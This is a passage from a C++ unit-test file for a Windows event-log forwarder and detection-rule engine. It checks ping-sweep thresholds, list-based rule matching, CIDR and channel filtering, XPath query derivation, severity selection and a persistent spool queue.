                              {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.1"}}).xml);
            CHECK(eng.evaluateOnce() == 0);
            buf.push(makeEvt(5156, L"Security",
                              {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.2"}}).xml);
            CHECK(eng.evaluateOnce() == 0);
        }

        // 3rd unique IP -> fires exactly once.
        buf.push(makeEvt(5156, L"Security",
                          {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.3"}}).xml);
        CHECK(eng.evaluateOnce() == 1);

        // Repeat of an already-seen IP after the reset -> 1 unique value in
        // the fresh window -> no re-fire.
        buf.push(makeEvt(5156, L"Security",
                          {{L"Protocol", L"1"}, {L"DestAddress", L"10.0.0.1"}}).xml);
        CHECK(eng.evaluateOnce() == 0);

        std::ifstream af("alerts.jsonl");
        int alertCount = 0;
        std::string line;
        while (std::getline(af, line)) {
            if (line.find("win_ping_sweep_distinct") != std::string::npos) ++alertCount;
        }
        CHECK(alertCount == 1);

        // Distinct evidence boundedness: 7 events were pushed (3x 10.0.0.1,
        // 3x 10.0.0.2, 1x 10.0.0.3) but only 3 unique values; the evidence
        // must carry exactly 3 representative events, one per unique value,
        // NOT one per raw event.
        std::ifstream af2("alerts.jsonl");
        std::string acontent((std::istreambuf_iterator<char>(af2)),
                             std::istreambuf_iterator<char>());
        CHECK(acontent.find("# Window events (3)") != std::string::npos);
        CHECK(acontent.find("Window events [4]") == std::string::npos);
    }

    // --- Reusable lists (@@ references) ---
    // Lists are newline-separated text files in a lists directory. A rule
    // references a list with `@@name`; the loader expands it at load time
    // into the field's value set. A missing/empty list makes the field match
    // nothing (safe default). `#` lines are comments and are skipped.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_lists");
        fs::create_directories("test_rules_lists");

        // List file: two real values, one comment, one blank line.
        std::ofstream("test_lists/sensitive.txt") <<
            "# Sensitive processes to alert on\n"
            "calc.exe\n"
            "\n"
            "notepad.exe\n";

        // Rule referencing the list: Image|contains: @@sensitive
        std::ofstream("test_rules_lists/win_list_match.yaml") <<
            "title: List Match\n"
            "id: win_list_match\n"
            "status: experimental\n"
            "level: low\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains: \"@@sensitive\"\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Sensitive process from list.\"\n";

        // Rule referencing a MISSING list: must match nothing.
        std::ofstream("test_rules_lists/win_list_missing.yaml") <<
            "title: List Missing\n"
            "id: win_list_missing\n"
            "status: experimental\n"
            "level: low\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains: \"@@does_not_exist\"\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Should never fire.\"\n";

        // Rule combining a list reference and a literal in a sequence.
        std::ofstream("test_rules_lists/win_list_combo.yaml") <<
            "title: List Combo\n"
            "id: win_list_combo\n"
            "status: experimental\n"
            "level: low\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains:\n"
            "      - \"@@sensitive\"\n"
            "      - mspaint.exe\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"List or literal match.\"\n";

        bool allParsed = true;
        auto listRules = loadRulesFromDirectory("test_rules_lists", "test_lists", allParsed);
        CHECK(listRules.size() == 3);
        CHECK(allParsed);

        // --- List match: calc.exe is in the list -> fires ---
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            std::vector<Detection> isolated;
            for (const auto& r : listRules) {
                if (r.id == "win_list_match") isolated.push_back(r);
            }
            EventBuffer buf;
            Forwarder fwd; fwd.setConfig(cfg);
            RuleEngine eng(buf, fwd);
            eng.reload(isolated);

            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
            size_t fires = eng.evaluateOnce();
            CHECK(fires == 1);

            std::ifstream af("alerts.jsonl");
            std::string acontent((std::istreambuf_iterator<char>(af)),
                                 std::istreambuf_iterator<char>());
            CHECK(acontent.find("rule_id: win_list_match") != std::string::npos);
        }

        // --- List match: notepad.exe is also in the list -> fires ---
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            std::vector<Detection> isolated;
            for (const auto& r : listRules) {
                if (r.id == "win_list_match") isolated.push_back(r);
            }
            EventBuffer buf;
            Forwarder fwd; fwd.setConfig(cfg);
            RuleEngine eng(buf, fwd);
            eng.reload(isolated);

            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\notepad.exe"}}).xml);
            size_t fires = eng.evaluateOnce();
            CHECK(fires == 1);
        }

        // --- List match: value NOT in list -> does NOT fire ---
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            std::vector<Detection> isolated;
            for (const auto& r : listRules) {
                if (r.id == "win_list_match") isolated.push_back(r);
            }
            EventBuffer buf;
            Forwarder fwd; fwd.setConfig(cfg);
            RuleEngine eng(buf, fwd);
            eng.reload(isolated);

            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\explorer.exe"}}).xml);
            size_t fires = eng.evaluateOnce();
            CHECK(fires == 0);
        }

        // --- Missing list: must match NOTHING (no fire) ---
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            std::vector<Detection> isolated;
            for (const auto& r : listRules) {
                if (r.id == "win_list_missing") isolated.push_back(r);
            }
            EventBuffer buf;
            Forwarder fwd; fwd.setConfig(cfg);
            RuleEngine eng(buf, fwd);
            eng.reload(isolated);

            // Even an event that would match if the list were a wildcard must
            // NOT fire, because the list is missing -> field matches nothing.
            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
            size_t fires = eng.evaluateOnce();
            CHECK(fires == 0);
        }

        // --- List + literal combo: list value fires ---
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            std::vector<Detection> isolated;
            for (const auto& r : listRules) {
                if (r.id == "win_list_combo") isolated.push_back(r);
            }
            EventBuffer buf;
            Forwarder fwd; fwd.setConfig(cfg);
            RuleEngine eng(buf, fwd);
            eng.reload(isolated);

            // calc.exe is in the list -> fires.
            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
            size_t fires = eng.evaluateOnce();
            CHECK(fires == 1);
        }

        // --- List + literal combo: literal value fires ---
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            std::vector<Detection> isolated;
            for (const auto& r : listRules) {
                if (r.id == "win_list_combo") isolated.push_back(r);
            }
            EventBuffer buf;
            Forwarder fwd; fwd.setConfig(cfg);
            RuleEngine eng(buf, fwd);
            eng.reload(isolated);

            // mspaint.exe is the literal -> fires.
            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\mspaint.exe"}}).xml);
            size_t fires = eng.evaluateOnce();
            CHECK(fires == 1);
        }

        // --- List + literal combo: neither value -> no fire ---
        {
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            std::vector<Detection> isolated;
            for (const auto& r : listRules) {
                if (r.id == "win_list_combo") isolated.push_back(r);
            }
            EventBuffer buf;
            Forwarder fwd; fwd.setConfig(cfg);
            RuleEngine eng(buf, fwd);
            eng.reload(isolated);

            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\explorer.exe"}}).xml);
            size_t fires = eng.evaluateOnce();
            CHECK(fires == 0);
        }

        // --- # comments are skipped: a value that only appears as a
        // comment must NOT match ---
        {
            // Rewrite the list so "calc.exe" is ONLY in a comment.
            std::ofstream("test_lists/sensitive.txt") <<
                "# calc.exe is sensitive\n"
                "notepad.exe\n";
            bool ap = true;
            auto lr = loadRulesFromDirectory("test_rules_lists", "test_lists", ap);
            std::vector<Detection> isolated;
            for (const auto& r : lr) {
                if (r.id == "win_list_match") isolated.push_back(r);
            }
            for (auto f : {"alerts.jsonl", "siem.jsonl", "data_lake.jsonl"}) std::remove(f);
            EventBuffer buf;
            Forwarder fwd; fwd.setConfig(cfg);
            RuleEngine eng(buf, fwd);
            eng.reload(isolated);

            // calc.exe is only a comment -> must NOT fire.
            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
            size_t fires = eng.evaluateOnce();
            CHECK(fires == 0);

            // notepad.exe is a real value -> fires.
            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\notepad.exe"}}).xml);
            size_t fires2 = eng.evaluateOnce();
            CHECK(fires2 == 1);
        }
    }

    // --- Regression: glob condition + filter selection + logsource category ---
    // A process_creation rule with
    //   condition: selection and not 1 of filter_main_*
    // and filter_main_cli_empty: { CommandLine: '' } must NOT fire on a
    // 5158 WFP network event. The event has no CommandLine, so the empty
    // filter matches; the rule stays quiet only if (1) parseIdent accepts
    // '*' in the glob, (2) a condition parse failure fails closed instead
    // of matching on ANY selection, and (3) logsource category filtering
    // skips process_creation rules on network events.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_glob");
        fs::path dir = "test_rules_glob";
        std::ofstream(dir / "snake_glob.yaml") <<
            "title: SNAKE Binary Indicator (glob filter)\n"
            "id: snake_glob\n"
            "status: test\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  category: process_creation\n"
            "detection:\n"
            "  selection:\n"
            "    Image|endswith:\n"
            "      - \\jpsetup.exe\n"
            "      - \\jpinst.exe\n"
            "  filter_main_cli_name:\n"
            "    CommandLine:\n"
            "      - jpinst.exe\n"
            "      - jpinst\n"
            "      - jpsetup.exe\n"
            "      - jpsetup\n"
            "  filter_main_cli_empty:\n"
            "    CommandLine: ''\n"
            "  filter_main_cli_null:\n"
            "    CommandLine: null\n"
            "  condition: selection and not 1 of filter_main_*\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_glob");
        CHECK(rules.size() == 1);

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        // 5158 WFP network event â€” must NOT fire (wrong category + filter
        // would match empty CommandLine).
        buf.push(makeEvt(5158, L"Security",
            {{L"ProcessId", L"10000"},
             {L"Application", L"\\device\\harddiskvolume3\\users\\admin\\desktop\\elf\\efficient_log_forwarder.exe"},
             {L"SourceAddress", L"0.0.0.0"},
             {L"SourcePort", L"49618"}}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires == 0);

        // Real process_creation event with matching Image and a non-empty
        // CommandLine that isn't in the filter â€” SHOULD fire.
        buf.push(makeEvt(4688, L"Security",
            {{L"NewProcessName", L"C:\\Some\\Path\\jpsetup.exe"},
             {L"CommandLine", L"jpsetup.exe -install"}}).xml);
        size_t fires2 = eng.evaluateOnce();
        CHECK(fires2 == 1);

        // Real process_creation event with matching Image but CommandLine
        // exactly matching the filter â€” must NOT fire (filter excludes it).
        buf.push(makeEvt(4688, L"Security",
            {{L"NewProcessName", L"C:\\Some\\Path\\jpinst.exe"},
             {L"CommandLine", L"jpinst"}}).xml);
        size_t fires3 = eng.evaluateOnce();
        CHECK(fires3 == 0);

        fs::remove_all("test_rules_glob");
    }

    // --- Regression: |cidr modifier on a filter selection ---
    // A rule shaped like "External Remote SMB Logon from Public IP" must
    // NOT fire on a private IP. The rule uses:
    //   selection:    EventID: 4624, LogonType: 3
    //   filter_main_local_ranges:
    //     IpAddress|cidr:
    //       - 10.0.0.0/8
    //       - 172.16.0.0/12
    //       - 192.168.0.0/16
    //   filter_main_empty:
    //     IpAddress: '-'
    //   condition: selection and not 1 of filter_main_*
    // |cidr must do a real IP-in-network check: 172.19.145.48 IS inside
    // 172.16.0.0/12, so the filter matches and the rule does NOT fire.
    // Approximating |cidr as `contains` would search for "172.16.0.0/12"
    // as a SUBSTRING of "172.19.145.48" (which never matches), so the
    // filter would fail to exclude the event.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_cidr");
        fs::path dir = "test_rules_cidr";
        std::ofstream(dir / "smb_public.yaml") <<
            "title: External Remote SMB Logon from Public IP\n"
            "id: smb_public_cidr\n"
            "status: test\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4624\n"
            "    LogonType: 3\n"
            "  filter_main_local_ranges:\n"
            "    IpAddress|cidr:\n"
            "      - ::1/128\n"
            "      - 10.0.0.0/8\n"
            "      - 127.0.0.0/8\n"
            "      - 172.16.0.0/12\n"
            "      - 192.168.0.0/16\n"
            "      - 169.254.0.0/16\n"
            "      - fc00::/7\n"
            "      - fe80::/10\n"
            "  filter_main_empty:\n"
            "    IpAddress: '-'\n"
            "  condition: selection and not 1 of filter_main_*\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_cidr");
        CHECK(rules.size() == 1);

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        // 4624 / LogonType 3 from 172.19.145.48, inside 172.16.0.0/12.
        // MUST NOT fire (the local-ranges filter excludes it).
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"Administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"172.19.145.48"}}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires == 0);

        // Same event but from a PUBLIC IP (8.8.8.8), outside all the
        // local ranges. SHOULD fire.
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"Administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"8.8.8.8"}}).xml);
        size_t fires2 = eng.evaluateOnce();
        CHECK(fires2 == 1);

        // 10.5.5.5 is inside 10.0.0.0/8; must NOT fire.
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"Administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"10.5.5.5"}}).xml);
        size_t fires3 = eng.evaluateOnce();
        CHECK(fires3 == 0);

        // 192.168.1.100 is inside 192.168.0.0/16; must NOT fire.
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"Administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"192.168.1.100"}}).xml);
        size_t fires4 = eng.evaluateOnce();
        CHECK(fires4 == 0);

        // IPv6 link-local fe80::1 is inside fe80::/10; must NOT fire.
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"Administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"fe80::1"}}).xml);
        size_t fires5 = eng.evaluateOnce();
        CHECK(fires5 == 0);

        // IPv6 public 2001:4860:4860::8888 is outside the local ranges;
        // SHOULD fire.
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"Administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"2001:4860:4860::8888"}}).xml);
        size_t fires6 = eng.evaluateOnce();
        CHECK(fires6 == 1);

        // IpAddress "-": the filter_main_empty filter matches it, so the
        // rule must NOT fire (the event is excluded by the empty filter).
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"Administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"-"}}).xml);
        size_t fires7 = eng.evaluateOnce();
        CHECK(fires7 == 0);

        // Cross-family: an IPv4 address must NOT match an IPv6 CIDR and
        // vice-versa. 172.19.145.48 is IPv4; fc00::/7 is IPv6. The CIDR
        // filter must not exclude it via the IPv6 ranges. But it IS inside
        // 172.16.0.0/12, so it's still excluded by the IPv4 ranges, so
        // this event must NOT fire. (This confirms the IPv6 ranges don't
        // accidentally swallow IPv4 addresses.)
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"Administrator"},
             {L"LogonType", L"3"},
             {L"IpAddress", L"172.19.145.48"}}).xml);
        size_t fires8 = eng.evaluateOnce();
        CHECK(fires8 == 0);

        fs::remove_all("test_rules_cidr");
    }

    // --- Service/channel matching (logsource.service) ---
    // A rule with `logsource.service: capi2` must only fire on events from
    // the CAPI2 channel (Microsoft-Windows-CAPI2/Operational), NOT on events
    // from an unrelated channel like
    // Microsoft-Windows-ServerManager-MgmtProvider/Operational.
    // ruleAppliesToEvent must honor logsource.service as well as
    // logsource.category; otherwise a rule with only a service (no
    // category) applies to every event.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_svc");
        fs::path dir = "test_rules_svc";
        std::ofstream(dir / "capi2_rule.yaml") <<
            "title: CAPI2 Rule\n"
            "id: capi2_rule\n"
            "status: test\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: capi2\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 70\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_svc");
        CHECK(rules.size() == 1);

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        // Event from the CAPI2 channel â€” SHOULD fire (service matches).
        buf.push(makeEvt(70, L"Microsoft-Windows-CAPI2/Operational",
            {{L"ProcessId", L"1234"}}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires == 1);

        // Event from an unrelated channel â€” must NOT fire (service mismatch).
        buf.push(makeEvt(70, L"Microsoft-Windows-ServerManager-MgmtProvider/Operational",
            {{L"ProcessId", L"1234"}}).xml);
        size_t fires2 = eng.evaluateOnce();
        CHECK(fires2 == 0);

        fs::remove_all("test_rules_svc");
    }

    // --- Service/channel matching: security service ---
    // A rule with `service: security` must only fire on Security channel
    // events, not on events from other channels.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_sec");
        fs::path dir = "test_rules_sec";
        std::ofstream(dir / "sec_rule.yaml") <<
            "title: Security Only Rule\n"
            "id: sec_rule\n"
            "status: test\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4624\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_sec");
        CHECK(rules.size() == 1);

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        // 4624 on Security channel â€” SHOULD fire.
        buf.push(makeEvt(4624, L"Security",
            {{L"TargetUserName", L"admin"}}).xml);
        size_t fires = eng.evaluateOnce();
        CHECK(fires == 1);

        // 4624 on a different channel â€” must NOT fire.
        buf.push(makeEvt(4624, L"Microsoft-Windows-ServerManager-MgmtProvider/Operational",
            {{L"TargetUserName", L"admin"}}).xml);
        size_t fires2 = eng.evaluateOnce();
        CHECK(fires2 == 0);

        fs::remove_all("test_rules_sec");
    }

    // --- XPath query builder: deriveChannelQueries unions EventIDs ---
    // The agent auto-derives a per-channel XPath filter from the loaded
    // rules so Windows only delivers events the rules can match. This test
    // verifies deriveChannelQueries() returns the right channelâ†’EventID
    // mapping: two rules on the Security channel (EventIDs 4624 and 4625)
    // should produce one Security entry with both IDs unioned, sorted.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_xpath");
        fs::path dir = "test_rules_xpath";
        std::ofstream(dir / "logon_success.yaml") <<
            "title: Logon Success\n"
            "id: win_logon_success\n"
            "status: test\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4624\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        std::ofstream(dir / "logon_failure.yaml") <<
            "title: Logon Failure\n"
            "id: win_logon_failure\n"
            "status: test\n"
            "level: low\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4625\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_xpath");
        CHECK(rules.size() == 2);

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        auto queries = eng.deriveChannelQueries();
        // One entry for the Security channel.
        CHECK(queries.size() == 1);
        // Channel names use canonical Windows case (EvtSubscribe rejects
        // lowercase names with ERROR_INVALID_PARAMETER).
        CHECK(queries[0].first == "Security");
        // Both EventIDs present (order may vary; check membership).
        CHECK(queries[0].second.size() == 2);
        bool has4624 = false, has4625 = false;
        for (int id : queries[0].second) {
            if (id == 4624) has4624 = true;
            if (id == 4625) has4625 = true;
        }
        CHECK(has4624);
        CHECK(has4625);

        fs::remove_all("test_rules_xpath");
    }

    // --- XPath query builder: catch-all rules force empty result ---
    // A catch-all rule (no logsource) can match any event on any channel,
    // so XPath pre-filtering is impossible. deriveChannelQueries() must
    // return an empty vector in that case so the caller falls back to
    // subscribeAll().
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_catchall");
        fs::path dir = "test_rules_catchall";
        std::ofstream(dir / "catchall.yaml") <<
            "title: Catch All\n"
            "id: win_catch_all\n"
            "status: test\n"
            "level: medium\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4624\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_catchall");
        CHECK(rules.size() == 1);

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        auto queries = eng.deriveChannelQueries();
        CHECK(queries.empty());

        fs::remove_all("test_rules_catchall");
    }

    // --- Severity-based selection: only highest-severity Simple rule fires ---
    // When two Simple rules match the same event, only the higher-severity
    // one should fire its alert. Here a "high" rule and a "low" rule both
    // match a 4688 calc.exe event; only the high rule's alert should appear
    // in alerts.jsonl.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_sev");
        fs::path dir = "test_rules_sev";
        std::ofstream(dir / "high_rule.yaml") <<
            "title: High Severity Calc\n"
            "id: win_calc_high\n"
            "status: test\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains: calc.exe\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        std::ofstream(dir / "low_rule.yaml") <<
            "title: Low Severity Calc\n"
            "id: win_calc_low\n"
            "status: test\n"
            "level: low\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains: calc.exe\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_sev");
        CHECK(rules.size() == 2);

        // Clear the alerts file so we only see this test's output.
        { std::ofstream ofs("alerts.jsonl", std::ios::trunc); }

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        buf.push(makeEvt(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
        size_t fires = eng.evaluateOnce();
        // Both rules matched (forward_event ran for both), but only one
        // alert fired (severity selection). fires counts matches, so >=1.
        CHECK(fires >= 1);

        std::ifstream af("alerts.jsonl");
        std::string acontent((std::istreambuf_iterator<char>(af)),
                             std::istreambuf_iterator<char>());
        // The high-severity rule's alert must be present.
        CHECK(acontent.find("rule_id: win_calc_high") != std::string::npos);
        // The low-severity rule's alert must NOT be present (suppressed by
        // severity selection).
        CHECK(acontent.find("rule_id: win_calc_low") == std::string::npos);

        fs::remove_all("test_rules_sev");
    }

    // --- Severity-based selection: tie broken by rule order (first wins) ---
    // When two Simple rules of EQUAL severity match the same event, the
    // first one (in file load order) wins. Here two "medium" rules both
    // match; only the first-loaded rule's alert should appear.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_tie");
        fs::path dir = "test_rules_tie";
        // "aaa_first.yaml" sorts before "zzz_second.yaml" so it loads first.
        std::ofstream(dir / "aaa_first.yaml") <<
            "title: First Medium\n"
            "id: win_first\n"
            "status: test\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains: calc.exe\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        std::ofstream(dir / "zzz_second.yaml") <<
            "title: Second Medium\n"
            "id: win_second\n"
            "status: test\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|contains: calc.exe\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_tie");
        CHECK(rules.size() == 2);

        // Clear the alerts file.
        { std::ofstream ofs("alerts.jsonl", std::ios::trunc); }

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        buf.push(makeEvt(4688, L"Security",
            {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}}).xml);
        eng.evaluateOnce();

        std::ifstream af("alerts.jsonl");
        std::string acontent((std::istreambuf_iterator<char>(af)),
                             std::istreambuf_iterator<char>());
        // The first-loaded rule wins the tie.
        CHECK(acontent.find("rule_id: win_first") != std::string::npos);
        CHECK(acontent.find("rule_id: win_second") == std::string::npos);

        fs::remove_all("test_rules_tie");
    }

    // --- SpoolQueue: basic enqueue/dequeue round-trip ---
    // The spool must persist entries to disk and read them back in FIFO
    // order. This is the core durability guarantee: a pending POST survives
    // a restart.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_spool_basic");
        fs::create_directories("test_spool_basic");

        SpoolQueue q;
        q.setDirectory("test_spool_basic", 100 * 1024 * 1024);
        q.enqueue("http://server/alerts", "body1");
        q.enqueue("http://server/logs", "body2");

        std::string url, body;
        CHECK(q.dequeue(url, body));
        CHECK(url == "http://server/alerts");
        CHECK(body == "body1");
        CHECK(q.dequeue(url, body));
        CHECK(url == "http://server/logs");
        CHECK(body == "body2");

        q.stop();
        // After stop, dequeue returns false (no more work).
        CHECK(!q.dequeue(url, body));

        fs::remove_all("test_spool_basic");
    }

    // --- SpoolQueue: load() recovers entries from a previous run ---
    // This simulates a restart: enqueue in one SpoolQueue instance, then
    // create a fresh instance pointed at the same dir and load() must
    // recover the pending entries in FIFO order.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_spool_load");
        fs::create_directories("test_spool_load");

        {
            SpoolQueue q;
            q.setDirectory("test_spool_load", 100 * 1024 * 1024);
            q.enqueue("http://server/a", "alpha");
            q.enqueue("http://server/b", "beta");
            q.enqueue("http://server/c", "gamma");
            // Don't dequeue â€” leave them on disk. Destructor calls stop().
        }

        // Fresh instance â€” load() should recover all three in order.
        SpoolQueue q2;
        q2.setDirectory("test_spool_load", 100 * 1024 * 1024);
        int loaded = q2.load();
        CHECK(loaded == 3);

        std::string url, body;
        CHECK(q2.dequeue(url, body));
        CHECK(url == "http://server/a");
        CHECK(body == "alpha");
        CHECK(q2.dequeue(url, body));
        CHECK(url == "http://server/b");
        CHECK(body == "beta");
        CHECK(q2.dequeue(url, body));
        CHECK(url == "http://server/c");
        CHECK(body == "gamma");

        q2.stop();
        fs::remove_all("test_spool_load");
    }

    // --- SpoolQueue: size cap evicts oldest first ---
    // When the spool exceeds maxBytes, the oldest entries are evicted
    // (dropped). This is the right policy for a forwarder: the oldest
    // events are the least valuable to an analyst.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_spool_evict");
        fs::create_directories("test_spool_evict");

        SpoolQueue q;
        // Very small cap so we can trigger eviction with a few entries.
        // Each entry has some overhead (filename + length prefixes), so a
        // 500-byte cap will hold only ~1-2 small entries.
        q.setDirectory("test_spool_evict", 500);
        q.enqueue("http://x/1", std::string(200, 'a'));
        q.enqueue("http://x/2", std::string(200, 'b'));
        q.enqueue("http://x/3", std::string(200, 'c'));

        // After 3 enqueues of ~200-byte bodies, the oldest (1) should have
        // been evicted to stay under the cap. Dequeue should return 2 then 3.
        std::string url, body;
        CHECK(q.dequeue(url, body));
        CHECK(url == "http://x/2");
        CHECK(q.dequeue(url, body));
        CHECK(url == "http://x/3");
        // No more â€” 1 was evicted. Must call stop() before the final
        // dequeue, otherwise dequeue blocks forever waiting for work.
        q.stop();
        CHECK(!q.dequeue(url, body));

        fs::remove_all("test_spool_evict");
    }

    // --- SpoolQueue: size() reports the in-memory count ---
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_spool_size");
